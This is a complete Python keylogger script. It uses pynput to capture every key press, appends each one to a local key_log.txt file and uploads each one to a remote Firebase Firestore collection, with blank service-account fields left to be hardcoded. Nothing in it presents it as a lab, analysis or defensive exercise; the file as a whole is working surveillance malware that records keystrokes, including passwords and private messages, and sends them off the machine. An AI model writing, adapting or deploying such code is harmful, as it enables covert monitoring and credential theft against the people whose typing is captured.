from pynput.keyboard import Key, Listener
from firebase_admin import credentials, firestore, initialize_app

def initialize_firebase():
    try:
        # Replace the following credentials with your hardcoded values
        cred = credentials.Certificate({
            "type": "",
            "project_id": "",
            "private_key_id": "",
            "private_key": "",
            "client_email": "",
            "client_id": "",
            "auth_uri": "",
            "token_uri": "",
            "auth_provider_x509_cert_url": "",
            "client_x509_cert_url": "",
            "universe_domain": ""
        })

        initialize_app(cred)
        print("\nFirebase initialized successfully.")
    except Exception as e:
        print(f"\nError initializing Firebase: {e}")

# Function to establish a connection to the Firebase database
def connect_to_database():
    initialize_firebase()
    try:
        db = firestore.client()
        return db

    except Exception as e:
        print(f"Error connecting to Firebase: {e}")
        return None

# Function to insert key press information into the database
def write_to_database(db, key):
    try:
        db.collection('key_log').add({'key_press': str(key)})
    except Exception as e:
        print(f"Error writing to database: {e}")

# Function to insert key press information into a file
def write_to_file(key):
    try:
        with open("key_log.txt", "a") as file:
            file.write(str(key) + '\n')
    except IOError as e:
        print(f"Error writing to file: {e}")

# Callback function for key press events
def on_press(key, db):
    try:
        write_to_database(db, key)
        write_to_file(key)
    except Exception as e:
        print(f"Error processing key: {e}")

# Callback function for key release events
def on_release(key):
    if key == Key.esc:
        # Stop the listener
        print("Keylogger execution interrupted by user.")
        return False

if __name__ == "__main__":
    # Establish a connection to the Firebase database
    db = connect_to_database()

    with Listener(on_press=lambda key: on_press(key, db),
                  on_release=on_release) as listener:
        try:
            listener.join()
        except KeyboardInterrupt:
            print("Keylogger execution interrupted by user.")
